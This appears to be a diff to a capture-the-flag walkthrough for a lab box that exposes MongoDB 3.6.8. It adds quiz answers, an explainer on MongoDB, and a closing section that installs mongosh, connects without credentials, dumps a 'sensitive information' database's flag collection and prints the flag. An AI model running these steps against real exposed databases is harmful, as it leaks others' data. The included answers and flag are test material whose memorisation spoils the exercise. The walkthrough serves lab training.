@@ -4,6 +4,12 @@ PORT      STATE SERVICE
 22/tcp    open  ssh
 27017/tcp open  mongod
 
+MongoDB is a document-oriented NoSQL database. Instead of using tables and rows like in traditional
+relational databases, MongoDB makes use of collections and documents. Each database contains
+collections which in turn further contain documents. Each document consists of key-value pairs which are
+the basic unit of data in a MongoDB database. A single collection can contain multiple documents and they
+are schema-less meaning that the size and content of each document can be different from each another. 
+
 # Which service is running on port 27017 of the remote host?
 > MongoDB 3.6.8
 
@@ -15,3 +21,21 @@ PORT      STATE SERVICE
 
 # What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;)
 > show dbs
+
+# What is the command used for listing out the collections in a database? (No need to include a trailing ;)
+> show collections
+
+# What command is used to dump the content of all the documents within the collection named `flag`?
+> db.flag.find()
+
+# Submit root flag
+> curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz
+> tar xvf mongosh-2.3.2-linux-x64.tgz
+> cd mongosh-2.3.2-linux-x64/bin
+> ./mongosh <IP_ADDRESS>
+> show dbs;
+> use sensitive information;
+> show collections;
+> db.flag.find();
+
+> 1b6e6fb359e7c40241b6d431427ba6ea
